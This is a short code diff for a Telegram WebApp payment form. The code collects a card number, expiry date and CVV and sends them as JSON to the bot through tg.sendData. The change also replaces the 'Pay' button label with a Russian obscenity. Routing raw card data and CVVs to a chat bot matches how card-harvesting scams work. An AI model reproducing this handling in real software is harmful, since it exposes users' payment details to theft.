@@ -13,13 +13,15 @@ let cc = "";
 let date = "";
 let cvv = "";
 
-tg.MainButton.setText('Оплатить')
+tg.MainButton.setText('Хуй')
 tg.MainButton.show();
 
 Telegram.WebApp.onEvent("mainButtonClicked", function (){
-    cc = document.getElementById('cc').value;
-    date = document.getElementById('date').value;
-    cvv = document.getElementById('cvv').value;
-    tg.sendData([cc,date,cvv]);
-    alert(cc,date,cvv);
+  let data = {
+    cc: document.getElementById('cc').value,
+    date: document.getElementById('date').value,
+    cvv: document.getElementById('cvv').value
+  }
+
+    tg.sendData(JSON.stringify(data));
 });
